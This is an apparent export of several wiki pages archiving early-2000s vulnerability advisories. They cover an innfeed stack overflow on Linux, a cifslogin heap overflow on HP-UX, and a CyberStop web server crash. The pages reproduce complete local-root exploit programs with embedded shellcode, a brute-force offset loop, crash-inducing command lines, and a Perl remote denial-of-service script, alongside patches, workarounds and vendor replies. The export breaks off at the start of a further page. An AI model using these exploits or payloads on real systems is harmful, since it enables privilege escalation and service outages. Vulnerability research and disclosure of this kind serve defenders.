Author: Enrique A. Sanchez Montellano &lt;@defcom.com&gt;
Author: Alex Hernandez &lt;alex.hernandez@defcom.com&gt;
Release Date: 2001-04-18
======================================================================
------------------------=[Brief Description]=-------------------------
innfeed is a program that implements the NNTP protocol for transerring
news between computers.

Due to no bounds checking on the innfeed program a buffer overflow
occurs while using the -c flag, thus rendering complete control
of the stack. And rendering news uid and gid.

------------------------=[Affected Systems]=--------------------------
Linux:
   Slackware 7.1 and older versions.
   Mandrake 7.0 and older versions.
   RedHat 7.2 and older versions.

----------------------=[Detailed Description]=------------------------
Due to no bounds checking on the logOrPrint() function on the vsprint()
a stack overflow occurs thus rendering the stack. The user then is able
to gain news id, in wich he can the trojan binaries to gain further
access to upgrade his priviledges.

Users trusted to group id can gain further access to news uid thus
gaining owner priviledges on the files and being able to trojan them
in some cases. And if root runs those binaries a root compromise might
be posible.

Offending code:
---------------

vsprintf (buffer,fmt,ap) ;

Example of exploitation:
------------------------

nahual@shell:~$ ls -al /usr/lib/news/bin/innfeed
-r-xr-x---   1 news     news       213124 Jun 14  2000 
/usr/lib/news/bin/innfeed*
nahual@shell:~$ ls -al /usr/lib/news/bin/startinnfeed
-r-sr-x---   1 root     news        40796 Jun 14  2000 
/usr/lib/news/bin/startinnfeed*
nahual@shell:~$ id
uid=1001(nahual) gid=100(users) groups=100(users),13(news)
nahual@shell:~$ ./x-innfeed
[ + ] innfeed buffer overflow (passed to startinnfeed) [ + ]
------------------------------------------------------------
[ + ] Found by:

[ + ] Alex Hernandez (alex.hernandez@defcom.com)
[ + ] Enrique Sanchez (@defcom.com ... Yes is just @defcom.com)
[ + ] Defcom Labs @ Spain ....
[ + ] Coded by Enrique A. Sanchez Montellano (El Nahual)

[ + ] Using address 0xbffff9e4
[ + ] Starting exploitation ...

bash$ id
uid=9(news) gid=13(news) groups=100(users),13(news)
bash$
----

Proof of concept code:
----------------------

--- x-startinnfeed.c ---
/*
  x-innfeed.c

  Buffer overflow in innfeed being called from startinnfeed renders 
uid(news) gid(news), startinnfeed is suid root so I have to also check 
if I can manage to get root out of this ....

  Enrique A. Sanchez Montellano
  (@defcom.com ... Yes is only @defcom.com)
*/

#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;

#define OFFSET  0
#define ALIGN   0
#define BUFFER  470

// MANDRAKE, REDHAT, etc....

#ifdef REDHAT
/* optimized shellcode ;) (got rid of 2 bytes from aleph1's) */
//static char shellcode[]=
//"\xeb\x15\x5b\x89\x5b\x08\x31\xc0\x88\x43\x07\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x31\xd2\xcd\x80\xe8\xe6\xff\xff\xff/bin/sh";
char shellcode[] = "\x31\xdb\x89\xd8\xb0\x17\xcd\x80" /*setuid(0) */
             "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c"
             "\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb"
             "\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";

#endif

#ifdef SLACKWARE
/* optimized shellcode for slackware 7.0 (non setuid(getuid()) shell) */
static char shellcode[]=
"\xeb\x15\x5b\x89\x5b\x0b\x31\xc0\x88\x43\x0a\x89\x43\x0f\xb0\x0b\x8d\x4b\x0b\x31\xd2\xcd\x80\xe8\xe6\xff\xff\xff/bin/bash1";
#endif

unsigned long get_sp(void) {
  __asm__("movl %esp, %eax");
}

void usage(char *name) {
  printf("Usage: %s &lt;offset&gt; &lt;align&gt; &lt;buffer&gt;\n", name);
  printf("Defcom Labs @ Spain ...\n");
  printf("Enrique A. Sanchez Montellano (@defcom.com)\n");
  exit(0);
}

int main(int argc, char **argv) {
  char *code;
  int offset = OFFSET;
  int align = ALIGN;
  int buffer = BUFFER;
  unsigned long addr;
  int i;

  if(argc &gt; 1) offset = atoi(argv[1]);
  if(argc &gt; 2) align = atoi(argv[2]);
  if(argc &gt; 3) buffer = atoi(argv[3]);

  code = (char *)malloc(buffer);

  printf("[ + ] innfeed buffer overflow (passed to startinnfeed) [ + ]\n");
  printf("------------------------------------------------------------\n");
  printf("[ + ] Found by: \n\n[ + ] Alex Hernandez 
(alex.hernandez@defcom.com) \n[ + ] Enrique Sanchez (@defcom.com ... Yes 
is just @defcom.com)\n");
  printf("[ + ] Defcom Labs @ Spain ....\n");
  printf("[ + ] Coded by Enrique A. Sanchez Montellano (El Nahual)\n\n");

  addr = get_sp() - offset;

  printf("[ + ] Using address 0x%x\n", addr);

  for(i = 0; i &lt;= buffer; i += 4) {
   *(long *)&amp;code[i] = 0x90909090;
  }

  *(long *)&amp;code[buffer - 4] = addr;
  *(long *)&amp;code[buffer - 8] = addr;

  memcpy(code + buffer - strlen(shellcode) -8 - align, shellcode, 
strlen(shellcode));

  printf("[ + ] Starting exploitation ... \n\n");

  // REDHAT, MANDRAKE ...
#ifdef REDHAT
  execl("/usr/bin/startinnfeed", "/usr/bin/startinnfeed", "-c", code, NULL);
#endif

  // SLACKWARE
#ifdef SLACKWARE
  execl("/usr/lib/news/bin/startinnfeed", 
"/usr/lib/news/bin/startinnfeed", "-c", code, NULL);
#endif

  return 0;
}

--- x-startinnfeed.c ---

--- brute.sh ---
#!/bin/ksh
L=-2000
O=40
while [ $L -lt 12000 ]
do
echo $L
L=`expr $L + 1`
./x-startinnfeed $L 
done
--- brute.sh ---

---------------------------=[Workaround]=-----------------------------
Defcom has issued a patch for the vulnerability:

---innfeed-overflow.patch---
210c210
&lt;       vsprintf (buffer,fmt,ap) ;
---
 &gt;       vsnprintf (buffer,512,fmt,ap) ;
---innfeed-overflow.patch---

The recomended action is to upgrade to version 2.3.1 wich is not
vulnerable to this attack due that you have to be news to execute the
script.

root should not run any of this commands as an administrative task
trusted users should do this.

-------------------------=[Vendor Response]=--------------------------
inn-bugs, Katshiro Kondou, and Russ Allbery responded in a fast
and swift way, answering questions.

Thank you to him and all the INN team for their time and responses.
======================================================================
        This release was brought to you by Defcom Labs @ Spain

             labs@defcom.com             www.defcom.com           
======================================================================


&lt;/pre&gt;

==brute.sh==
&lt;pre&gt;

#!/bin/ksh
L=-2000
O=40
while [ $L -lt 12000 ]
do
echo $L
L=`expr $L + 1`
./x-startinnfeed $L 
done
&lt;/pre&gt;</text>
      <sha1>d0evsmi3fkohc9pf93yfilym4mo9wx6</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2002-0091 Sharity緩衝區溢出漏洞</title>
    <ns>0</ns>
    <id>591</id>
    <revision>
      <id>805</id>
      <timestamp>2021-03-31T07:23:56Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO1== &lt;pre&gt;  Sharity Cifslogin Buffer Overflow (arguments) =============================================  Author:  ** Alex Hernandez &lt;alex_hernandez@ureach.com&gt; (C) 2002..."</comment>
      <origin>805</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="20072" sha1="g9xagb9r2cnpvrrqeo1px0pve0h7zpa" xml:space="preserve">==INFO1==
&lt;pre&gt;

Sharity Cifslogin Buffer Overflow (arguments)
=============================================

Author:

** Alex Hernandez &lt;alex_hernandez@ureach.com&gt; (C) 2002

** Thanks all the people from Spain and Argentina.
** Greets to: Paco Spain, Gabriel M, L.martins.
** Thanks friends for all ur help Zillion &amp; Kevin from
** Snosoft http://www.snosoft.com :-).


Affected system:
================

HP-UX	ALL


What is Sharity?
================

Sharity is a software package that runs on Unix machines and allows you to
mount shares exported by Windows (NT, 95, for Workgroups, etc.), OS/2,
samba etc. in your filesystem. It's NOT an ftp-like client like the
smbclient program distributed with samba, it really mounts the shares in
your filesystem just as NFS does. Since the major release 2, Sharity
supports browsing (like the Windows "Network Neighborhood") and has a GUI
for dialogs and for the configuration.




Description:
============


TESTED IN HP-UX

This command logs the calling user in to a server. While the login
is established, all file accesses by the calling user are performed
under the permissions available at the server with the credentials
passed to cifslogin. &lt;server&gt; must be the netbios name of the server
where you want to log in. If the server is in share-level security
mode, you must use the second form and specify the share you want to
log in to. The server name must be resolvable through the netbios
name service or with DNS. If neither gives an IP address, you can
configure the IP address explicitly in the configuration file.
Valid options are:


    -h   Print short help and exit
    -U &lt;username&gt; Login on server as this user. By default, the remote
         username is the same as the calling user's local name.
    -D &lt;domain&gt; Send this domain name to server. If not specified,
         Sharity's default domain is used. Some servers accept connects
         only from clients from their own domain.
    -P &lt;password&gt; Password given in commandline. Using this option is
         STRONGLY discouraged because it will write your password to the
         shell's history file.
    -S   Read password from standard input (implies -N). This option can
         be used if the password is created by an external program (e.g.
         retrieved from a database).
    -N   Don't prompt for a password. If no password is given by the -P
         or -S options, use an empty password.
    -u   Allow sending password unencrypted. Sharity does not allow
         sending unencrypted passwords by default (for security reasons).

If you don't specify a share name for a share-level security server,
cifslogin prompts the user for the share name.

If the password is not supplied with the -S or -P option and if
the user is not already logged in, cifslogin prompts the user for
a password.

A security vulnerability in the product allows local users to overflow one of 
the parameters (-U, -D, -P, -S, -N, -u,) and cause the application to execute 
arbitrary code. Since the program is setuid root, elevated privileges 
can be gained. 


In case that the attacker provide an overlong filename (for example, longer
than 10000 bytes) for example parameter "-P", it would overflow a dynamic 
allocated buffer.The attacker could modify arbitrary memory address (such as 
saved return address, and function pointer, etc.) with some features of 
malloc()/free() implementation by overwriting the border data structure 
of the next dynamic memory chunk.


On HP-UX platform, attacker could obtain root group privilege;



Exploit:
==========


$ id
uid=110(alex) gid=102(informix)
$

$ uname -a
HP-UX Lab02 B.11.11 U 9000/800 1613339393 unlimited-user license
$

$ ls -la /opt/cifsclient/bin/cifslogin
-rwsr-xr-x   1 root       users        53248 Mar 28  2001 /opt/cifsclient/bin/cifslogin


$ /opt/cifsclient/bin/cifslogin -P `perl -e '{print "A"x10000}'`
Memory fault

$


MAPPED WITH TUSC:

Brief description about the command:

tusc-7.3

Traces the system calls a process invokes in HP-UX 11. It displays arguments in a symbolic way, shows the
first bytes of read and write buffers and shows signal information when available. Tusc can attach to live
processes by providing PIDs as arguments. This release also provides a truss command compatible with the
equivalent Solaris utility. Note that source code is unavailable for tusc and that the shipped tusc binary
ONLY works on HP-UX 11.X. Please download the equivalent package for HP-UX 10.X - called trace -
if you don't have HP-UX 11.X.

Download for HP-UX:

http://hpux.cs.utah.edu/hppd/hpux/Sysadmin/tusc-7.3/



Proof of Concept:


$ ./tusc /opt/cifsclient/bin/cifslogin -P `perl -e '{print "A"x10000}'`

execve("/opt/cifsclient/bin/cifslogin", 0x7f7f2b68, 0x7f7f2b78) ........................................ = 0 [32-bit]
utssys(0x7f7f4c50, 0, 0) ............................................................................... = 0
open("/usr/lib/dld.sl", O_RDONLY, 025564) .............................................................. = 3
read(3, "02\v010e0512@ \0\0\0\0\0\0\0\0\0".., 128) ..................................................... = 128
lseek(3, 128, SEEK_SET) ................................................................................ = 128
read(3, "10\0\004\0\0\0( \002\0ac\0\0\0\0".., 48) ...................................................... = 48
mmap(NULL, 131244, PROT_READ|PROT_EXEC, MAP_SHARED|MAP_SHLIB, 3, 0x9000) ............................... = 0xc0010000
mmap(NULL, 14696, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_SHLIB, 3, 0x2a000) ................... = 0x7b050000
close(3) ............................................................................................... = 0
getuid() ............................................................................................... = 110 (110)
getuid() ............................................................................................... = 110 (110)
getgid() ............................................................................................... = 102 (102)
getgid() ............................................................................................... = 102 (102)
mmap(NULL, 8192, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, NULL) .................. = 0x7b04e000
sysconf(_SC_CPU_VERSION) ............................................................................... = 532
open("/opt/graphics/OpenGL/lib/libogltls.sl", O_RDONLY, 0) ............................................. ERR#2 ENOENT
open("/usr/lib/libc.2", O_RDONLY, 0) ................................................................... = 3
fstat(3, 0x7f7f54c8) ................................................................................... = 0
read(3, "0214010e0512@ \0\0\0\0\0\0\0\0\0".., 128) ..................................................... = 128
lseek(3, 128, SEEK_SET) ................................................................................ = 128
read(3, "10\0\004\0\0\0( \014( , \0\010\0".., 48) ...................................................... = 48
read(3, "80\0\0\v\0\0\004\0\0\0\0", 12) ................................................................ = 12
lseek(3, 446464, SEEK_SET) ............................................................................. = 446464
read(3, "058cy 10\0\0\a90\0\0M e8\0\0\002".., 112) ..................................................... = 112
mmap(NULL, 1323008, PROT_READ|PROT_EXEC, MAP_SHARED|MAP_SHLIB, 3, 0x6d000) ............................. = 0xc0100000
mmap(NULL, 45056, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_SHLIB, -1, NULL) ....... = 0x7b043000
mmap(0x7b03b000, 32768, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_SHLIB, 3, 0x1b0000) .. = 0x7b03b000
mmap(NULL, 16384, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, NULL) ................. = 0x7b037000
close(3) ............................................................................................... = 0
open("/usr/lib/libdld.2", O_RDONLY, 0) ................................................................. = 3
fstat(3, 0x7f7f55c8) ................................................................................... = 0
read(3, "02\v010e0512@ \0\0\0\0\0\0\0\0\0".., 128) ..................................................... = 128
lseek(3, 128, SEEK_SET) ................................................................................ = 128
read(3, "10\0\004\0\0\0( \0\0$ e4\0\010\0".., 48) ...................................................... = 48
read(3, "80\0\0\v\0\0\004\0\0\0\0", 12) ................................................................ = 12
lseek(3, 8192, SEEK_SET) ............................................................................... = 8192
read(3, "058cy 10\0\0\0\f\0\001ac\0\0\001".., 112) ..................................................... = 112
mmap(NULL, 12288, PROT_READ|PROT_EXEC, MAP_SHARED|MAP_SHLIB, 3, 0x2000) ................................ = 0xc0004000
mmap(NULL, 4096, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_SHLIB, 3, 0x5000) ..................... = 0x7b036000
close(3) ............................................................................................... = 0
open("/usr/lib/libc.2", O_RDONLY, 0) ................................................................... = 3
fstat(3, 0x7f7f56c8) ................................................................................... = 0
read(3, "0214010e0512@ \0\0\0\0\0\0\0\0\0".., 128) ..................................................... = 128
lseek(3, 128, SEEK_SET) ................................................................................ = 128
read(3, "10\0\004\0\0\0( \014( , \0\010\0".., 48) ...................................................... = 48
read(3, "80\0\0\v\0\0\004\0\0\0\0", 12) ................................................................ = 12
lseek(3, 446464, SEEK_SET) ............................................................................. = 446464
read(3, "058cy 10\0\0\a90\0\0M e8\0\0\002".., 112) ..................................................... = 112
mmap(NULL, 1323008, PROT_READ|PROT_EXEC, MAP_SHARED|MAP_SHLIB, 3, 0x6d000) ............................. ERR#12 ENOMEM
close(3) ............................................................................................... = 0
open("/usr/lib/libnsl.1", O_RDONLY, 0) ................................................................. = 3
fstat(3, 0x7f7f54c8) ................................................................................... = 0
read(3, "0210010e0512@ \0\0\0\0\0\0\0\0\0".., 128) ..................................................... = 128
lseek(3, 128, SEEK_SET) ................................................................................ = 128
read(3, "10\0\004\0\0\0( \0\b9384\0\010\0".., 48) ...................................................... = 48
read(3, "80\0\0\v\0\0\004\0\0\0\0", 12) ................................................................ = 12
lseek(3, 131072, SEEK_SET) ............................................................................. = 131072
read(3, "058cy 10\0\004  \0\0; L \0\0\002".., 112) ..................................................... = 112
mmap(NULL, 565248, PROT_READ|PROT_EXEC, MAP_SHARED|MAP_SHLIB, 3, 0x20000) .............................. = 0xc0280000
mmap(NULL, 24576, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_SHLIB, -1, NULL) ....... = 0x7b030000
mmap(0x7b029000, 28672, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_SHLIB, 3, 0xaa000) ... = 0x7b029000
mmap(NULL, 8192, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, NULL) .................. = 0x7b027000
close(3) ............................................................................................... = 0
stat("/usr/lib/libxti.2", 0x7f7f5500) .................................................................. = 0
mmap(NULL, 16384, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, NULL) ................. = 0x7b023000
open("/usr/lib/libxti.2", O_RDONLY, 0) ................................................................. = 3
fstat(3, 0x7f7f55c8) ................................................................................... = 0
read(3, "0210010e0512@ \0\0\0\0\0\0\0\0\0".., 128) ..................................................... = 128
lseek(3, 128, SEEK_SET) ................................................................................ = 128
read(3, "10\0\004\0\0\0( \001~ l \0\010\0".., 48) ...................................................... = 48
read(3, "80\0\0\v\0\0\004\0\0\0\0", 12) ................................................................ = 12
lseek(3, 28672, SEEK_SET) .............................................................................. = 28672
read(3, "058cy 10\0\0\0d8\0\0\ac0\0\0\001".., 112) ..................................................... = 112
mmap(NULL, 98304, PROT_READ|PROT_EXEC, MAP_SHARED|MAP_SHLIB, 3, 0x7000) ................................ = 0xc0060000
mmap(NULL, 4096, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_SHLIB, -1, NULL) ........ = 0x7b022000
mmap(0x7b020000, 8192, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_SHLIB, 3, 0x1f000) .... = 0x7b020000
close(3) ............................................................................................... = 0
mmap(NULL, 80, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, NULL) .................... = 0x7b01f000
sigsetreturn(0x7b038fce, 0x6211988, 1392) .............................................................. = 0
alarm(0) ............................................................................................... = 0
getuid() ............................................................................................... = 110 (110)
getuid() ............................................................................................... = 110 (110)

  Received signal 11, SIGSEGV, in user mode, [SIG_DFL], partial siginfo
    Siginfo: si_code: I_NONEXIST, faulting address: 0x4141414d, si_errno: 0
    PC: 0xc01ef413, instruction: 0x443f0018
exit(11) [implicit] ....................................................................................
WIFSIGNALED(SIGSEGV)

$


Others Parameters Vulnerables:


$ /opt/cifsclient/bin/cifslogin -P `perl -e '{print "A"x2072}'`
Memory fault

$ /opt/cifsclient/bin/cifslogin -s `perl -e '{print "A"x2072}'`
Memory fault

$ /opt/cifsclient/bin/cifslogin -f `perl -e '{print "A"x2072}'`
Memory fault

$ /opt/cifsclient/bin/cifslogin -u `perl -e '{print "A"x2072}'`
Memory fault

$ /opt/cifsclient/bin/cifslogin -S `perl -e '{print "A"x2072}'`
Memory fault

$ /opt/cifsclient/bin/cifslogin -N `perl -e '{print "A"x2072}'`
Memory fault



Workaround:
===================

Temporarily remove the suid root or sgid root attribute of cifslogin:


# chmod a-s /opt/cifsclient/bin/cifslogin




Vendor Status:
==============

---
Contact information:
e-mail: sharity@obdev.at
www:    http://www.obdev.at/
Author: Christian Starkjohann &lt;cs@obdev.at&gt;

Response:

Date   Sat, 15 June 2002 8:54:01am  
From   Sharity Support &lt;sharity-support@obdev.at&gt;  Add to address book  
To   &lt;alex_hernandez@ureach.com&gt; 


The /opt/cifsclient/bin/cifslogin program is NOT part of Sharity. This 
is HP's CIFS client. HP has based this client on an old version of 
Sharity which they have licensed.

I will forward your report to the people at HP who are responsible for 
this software. I'll give credits to you, of course.

Thanks for reporting this problem!

Regards, Christian.

---
Sharity Support, Objective Development.
sharity-support@obdev.at



---------
security-alert@hp.com
secure@hpchs.cup.hp.com




Response:

Date   Mon, 17 June 2002 2:40:18pm  
From   HP S/W Security Team &lt;secure@hpchs.cup.hp.com&gt;  Add to address book  
To   alex_hernandez@ureach.com 

Hello Mr: Hernandez,

Please read it, retrieve the patch, and apply
it to your Lab02 11.11 installation.  The patch can
be retrieved *without* a support contract by registering
with itrc.hp.com.  (Registration is for simplified
mailing list maintenance on our part.  Without that -
no patches can be retrieved.)


Yours Truly,
WTEC
HP S/W Security Team.
--



FIXES:
======

Recommended solution

*REVISED01*

 --&gt;&gt;&gt;Upgrade to A.01.06, and then install patch PHNE_24164 for
 --&gt;&gt;&gt;HP-UX release 11.00 or 11.11.
 --&gt;&gt;&gt;When available, A.01.07 will include this fix.
 --&gt;&gt;&gt;Download this application software from
 --&gt;&gt;&gt;www.software.hp.com,  under the Network and System
 --&gt;&gt;&gt;Management area.  Download the patch from itrc.hp.com.

To subscribe to automatically receive future NEW HP Security
Bulletins from the HP IT Resource Center via electronic mail,
do the following:

Use your browser to get to the HP IT Resource Center page
at:

http://itrc.hp.com

 

For information on the Security Patch Check tool, see:

http://www.software.hp.com/cgi-bin/swdepot_parser.cgi/cgi/displayProductInfo
.pl?productNumber=B6834AA"

This vulnerabilty can be fix with SAMBA Bugs HP-UX:

**REVISED01**HEWLETT-PACKARD COMPANY SECURITY BULLETIN: #0155, 27 June '01
LAST REVISED: 15 August '01 
 -----------------------------------------------------------------------

The information in the following Security Bulletin should be acted upon
as soon as possible.  Hewlett-Packard Company will not be liable for any
consequences to any customer resulting from customer's failure to fully
implement instructions in this Security Bulletin as soon as possible.

 -----------------------------------------------------------------------

PROBLEM:  CIFS/9000 Server (SAMBA) allows malicious local users
          to overwrite arbitrary files and devices.

PLATFORM: HP 9000 servers running CIFS/9000 Server version A.01.06,
          or lower.

DAMAGE:   Arbitrary files and devices can be overwritten.

*REVISED01*
SOLUTION: Upgrade to A.01.06, and then install patch PHNE_24164.
    ---&gt;&gt;&gt;When available, A.01.07 will include this fix. 

*REVISED01*
AVAILABILITY:  The patch is available now.

[...]



Alex Hernandez &lt;alex_hernandez@ureach.com&gt; (C) 2002

&lt;/pre&gt;

==ex_cifslogin.c==
&lt;pre&gt;
/*
Source: http://www.securityfocus.com/bid/5088/info

A vulnerability has been reported in the /opt/cifsclient/bin/cifslogin utility distributed with CIFS/9000. The utility is prone to several buffer overflow conditions and may lead to root compromise.

The vulnerability occurs due to the lack of bounds checking when accepting user input for various commandline options. Specifically, the utility fails to check for excessively long arguments to the following commandline options: '-U', '-D', '-P', '-S', '-N', and '-u'.


Name    : ex_cifslogin.c
Compile : cc ex_cifslogin -o cifslogin
Purpose : exploit cifslogin command for HP-UX 11.11 11.0 10.20 to get root shell
Author  : watercloud &lt; safesuite@263.net, watercloud@xfocus.net &gt;
Date    : 2002-11-6
Announce: Use as your own risk
Thanks  : bear &lt; bearundertree@163.com &gt;
Tested  : HPUX B11.11
*/
#include&lt;stdio.h&gt;

#define T_LEN  2304
#define BUFF_LEN 2176
#define NOP 0x0b390280

char shellcode[]=
        "\xe8\x3f\x1f\xfd\xb4\x23\x03\xe8\x60\x60\x3c\x61\x0b\x39\x02"
        "\x99\x34\x1a\x3c\x53\x0b\x43\x06\x1a\x20\x20\x08\x01\x34\x16\x03"
        "\xe8\xe4\x20\xe0\x08\x96\xd6\x03\xfe/bin/shA";
long addr;
char buffer[T_LEN];

main()
{
        int addr_off =800 ;

        int  n=BUFF_LEN/4,i=0;
        long * ap = (long *) &amp;buffer[BUFF_LEN];
        char * sp = &amp;buffer[BUFF_LEN-strlen(shellcode)];
        long * np = (long *) buffer;

        addr = ((long) &amp;addr_off + T_LEN ) &amp; 0xffffff40 +0x40 ;

        for(i=0;i&lt;n;np[i++]=NOP);
        memcpy(sp,shellcode,strlen(shellcode));
        for(i=0;i&lt;(T_LEN-BUFF_LEN)/4;ap[i++]=addr+addr_off);

        printf("SP=0x%x EXP_SP=0x%x OFF=0x%x (%i)\n",(long)&amp;addr_off &amp; 0xffffff40,addr,addr_off);
        printf("Addr =0x%x NOP_LEN=%i\n",addr+addr_off,BUFF_LEN-strlen(shellcode));
        printf("BUFFER_LEN=%i\n",strlen(buffer));

        execl("/opt/cifsclient/bin/cifslogin","cifslogin","123",buffer,NULL);

&lt;/pre&gt;</text>
      <sha1>g9xagb9r2cnpvrrqeo1px0pve0h7zpa</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2002-0200 Cyber​​stop Web拒絕服務漏洞</title>
    <ns>0</ns>
    <id>582</id>
    <revision>
      <id>796</id>
      <timestamp>2021-03-31T06:45:36Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== &lt;pre&gt; ------oOo------ CyberStop WEbserver DoS Remote attacks. ------oOo------  CyberStop WEbserver for Windows 9x/NT/2000 contains remote vulnerabilities  which allow..."</comment>
      <origin>796</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1129" sha1="bnrm0kv77faoodmfkylri8h2mvg684p" xml:space="preserve">==INFO==
&lt;pre&gt;
------oOo------
CyberStop WEbserver DoS Remote attacks.
------oOo------

CyberStop WEbserver for Windows 9x/NT/2000 contains remote vulnerabilities 
which allow users to attack remote services on the server. 
Exploit information included.

Company Affected: www.cyberstop.com.sg
Download: http://www.cyberstop.com.sg/webserver/webserver.zip
Version: v0.1
Date Added: 12-DIC-01
Size: 2.84 MB
OS Affected: Windows ALL.

Author:

** Alex Hernandez &lt;al3xhernandez@ureach.com&gt;
** Thanks all the people from Spain and Argentina.
** Special Greets: White-B, Pablo S0r, Paco Spain, L.Martins 
** G.Maggiotti &amp; H.Oliveira.

----=[Brief Description]=------------

DoS 
A Denial of Service attack can be caused in the product by issuing
the following request: 

http://www.example.com/aux
http://www.example.com/prn
http://www.example.com/com1

------oOo------------------------------------
Vendor Response:
The vendor was notified
help@cyberstopasia.com
http://www.cyberstop.com.sg
Patch Temporary: No Data of vendor.

Alex Hernandez &lt;al3xhernandez@ureach.com&gt; (c) 2002.

------oOo------------------------------------
&lt;/pre&gt;</text>
      <sha1>bnrm0kv77faoodmfkylri8h2mvg684p</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2002-0201 Cyber​​stop Web緩衝區溢出漏洞</title>
    <ns>0</ns>
    <id>583</id>
    <revision>
      <id>797</id>
      <timestamp>2021-03-31T06:47:31Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== &lt;pre&gt; ------oOo------ CyberStop WEbserver DoS Remote attacks. ------oOo------  CyberStop WEbserver for Windows 9x/NT/2000 contains remote vulnerabilities  which allow..."</comment>
      <origin>797</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2768" sha1="abzblkowazbf7e2216x7ij2v1xkc1p8" xml:space="preserve">==INFO==
&lt;pre&gt;
------oOo------
CyberStop WEbserver DoS Remote attacks.
------oOo------

CyberStop WEbserver for Windows 9x/NT/2000 contains remote vulnerabilities 
which allow users to attack remote services on the server. 
Exploit information included.

Company Affected: www.cyberstop.com.sg
Download: http://www.cyberstop.com.sg/webserver/webserver.zip
Version: v0.1
Date Added: 12-DIC-01
Size: 2.84 MB
OS Affected: Windows ALL.

Author:

** Alex Hernandez &lt;al3xhernandez@ureach.com&gt;
** Thanks all the people from Spain and Argentina.
** Special Greets: White-B, Pablo S0r, Paco Spain, L.Martins 
** G.Maggiotti &amp; H.Oliveira.

----=[Brief Description]=------------

Proof Of concept 

# uname -a
SunOS Lab 5.8 Generic_108528-03 sun4u sparc SUNW,Ultra-5_10
#

# perl -e ' for ($i=1;$i&lt;2049;$i++) { print "A";} ' | nc 10.0.0.1 80
#

Exist a service named "Proyect1" and may be u can reading something 
like this on Windows Server: 

"Run-time error 40006":
Wrong protocol or connection state for the request transaction or 
request.

"Run-time error "5":
Invalid procedure call or argument.

Crash system and the admin need restart the service!.

------oOo------------------------------------
Vendor Response:
The vendor was notified
help@cyberstopasia.com
http://www.cyberstop.com.sg
Patch Temporary: No Data of vendor.

Alex Hernandez &lt;al3xhernandez@ureach.com&gt; (c) 2002.

------oOo------------------------------------
&lt;/pre&gt;

==Cyber_Dos.pl==
&lt;pre&gt;
#!/usr/bin/perl
# Simple script to send a long 'A^s' command to the server, 
# resulting in the server crashing.
#
# CyberStop WEbserver v0.1 proof-of-concept exploit
# By Alex Hernandez &lt;al3xhernandez@ureach.com&gt; (C)2002.
#
# Thanks all the people from Spain and Argentina.
# Special Greets: White-B, Pablo S0r, Paco Spain, L.Martins, 
# G.Maggiotti &amp; H.Oliveira.
# 
#
# Usage: perl -x Cyber_DoS.pl -s &lt;server&gt;
#
# Example: 
#
# perl -x Cyber_DoS.pl -s 10.0.0.1
# 
# Crash was successful !
#

use Getopt::Std;
use IO::Socket;

print("\nCyberStop WEbserver v0.1 DoS exploit (c)2002.\n");
print("Alex Hernandez al3xhernandez\@ureach.com\n\n");

getopts('s:', \%args);
if(!defined($args{s})){&amp;usage;}

($serv,$port,$def,$num,$data,$buf,$in_addr,$paddr,$proto);

$def = "A";
$num = "3000";
$data .= $def x $num;
$serv = $args{s};
$port = 80;
$buf = "GET /$data /HTTP/1.0\r\n\r\n";


$in_addr = (gethostbyname($serv))[4] || die("Error: $!\n");
$paddr = sockaddr_in($port, $in_addr) || die ("Error: $!\n");
$proto = getprotobyname('tcp') || die("Error: $!\n");

socket(S, PF_INET, SOCK_STREAM, $proto) || die("Error: $!");
connect(S, $paddr) ||die ("Error: $!");
select(S); $| = 1; select(STDOUT);
print S "$buf";


print("\nCrash was successful !\n\n");

sub usage {die("\n\nUsage: perl -x $0 -s &lt;server&gt;\n\n");}
&lt;/pre&gt;</text>
      <sha1>abzblkowazbf7e2216x7ij2v1xkc1p8</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2002-0288 Phusion web server 1.0 目錄遍歷漏洞</title>
    <ns>0</ns>
    <id>584</id>
    <revision>
      <id>798</id>
      <timestamp>2021-03-31T07:05:38Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
